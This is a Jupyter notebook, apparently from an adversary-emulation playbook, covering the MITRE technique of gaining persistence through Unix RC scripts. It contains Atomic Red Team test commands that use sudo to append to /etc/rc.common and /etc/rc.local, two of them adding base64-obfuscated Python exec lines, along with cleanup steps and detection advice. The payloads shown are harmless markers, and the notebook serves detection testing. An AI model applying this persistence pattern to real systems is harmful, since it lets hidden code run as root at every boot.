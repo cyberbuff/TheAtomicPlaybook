{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "e67eac40",
   "metadata": {},
   "source": "# T1037.004 - RC Scripts\nAdversaries may establish persistence by modifying RC scripts which are executed during a Unix-like system\u2019s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.\n\nAdversaries can establish persistence by adding a malicious binary path or shell commands to <code>rc.local</code>, <code>rc.common</code>, and other RC scripts specific to the Unix-like distribution.(Citation: IranThreats Kittens Dec 2017)(Citation: Intezer HiddenWasp Map 2019) Upon reboot, the system executes the script's contents as root, resulting in persistence.\n\nAdversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as IoT or embedded systems.(Citation: intezer-kaiji-malware)\n\nSeveral Unix-like systems have moved to Systemd and deprecated the use of RC scripts. This is now a deprecated mechanism in macOS in favor of [Launchd](https://attack.mitre.org/techniques/T1053/004). (Citation: Apple Developer Doco Archive Launchd)(Citation: Startup Items) This technique can be used on Mac OS X Panther v10.3 and earlier versions which still execute the RC scripts.(Citation: Methods of Mac Malware Persistence) To maintain backwards compatibility some systems, such as Ubuntu, will execute the RC scripts if they exist with the correct file permissions.(Citation: Ubuntu Manpage systemd rc)"
  },
  {
   "cell_type": "markdown",
   "id": "94b3adfc",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "cc0de634",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - rc.common",
    "Modify rc.common\n\n[Reference](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/StartupItems.html)\n",
    "**Supported Platforms:** macos",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\nsudo echo osascript -e 'tell app \"Finder\" to display dialog \"Hello World\"' >> /etc/rc.common\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "23c7daa4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1037.004 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "c0d44f96",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - rc.common",
    "Modify rc.common\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\nfilename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi\nprintf '%s\\n' '#!/bin/bash' | sudo tee /etc/rc.common\necho \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\\\"\" | sudo tee -a /etc/rc.common\nprintf '%s\\n' 'exit 0' | sudo tee -a /etc/rc.common\nsudo chmod +x /etc/rc.common\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "85555d6f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1037.004 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "9b1f5430",
   "metadata": {},
   "source": "#### Cleanup: \n```bash\norigfilename='/etc/rc.common.original';if [ ! -f $origfilename ];then sudo rm /etc/rc.common;else sudo cp $origfilename /etc/rc.common && sudo rm $origfilename;fi\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8b7c645d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1037.004 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "53d8093b",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - rc.local",
    "Modify rc.local\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\nfilename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi\nprintf '%s\\n' '#!/bin/bash' | sudo tee /etc/rc.local\necho \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\\\"\" | sudo tee -a /etc/rc.local\nprintf '%s\\n' 'exit 0' | sudo tee -a /etc/rc.local\nsudo chmod +x /etc/rc.local\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9147e653",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1037.004 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "69129600",
   "metadata": {},
   "source": "#### Cleanup: \n```bash\norigfilename='/etc/rc.local.original';if [ ! -f $origfilename ];then sudo rm /etc/rc.local;else sudo cp $origfilename /etc/rc.local && sudo rm $origfilename;fi\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3872c82c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1037.004 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "21304a60",
   "metadata": {},
   "source": "## Detection\nMonitor for unexpected changes to RC scripts in the <code>/etc/</code> directory. Monitor process execution resulting from RC scripts for unusual or unknown applications or behavior.\n\nMonitor for <code>/etc/rc.local</code> file creation. Although types of RC scripts vary for each Unix-like distribution, several execute <code>/etc/rc.local</code> if present. "
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}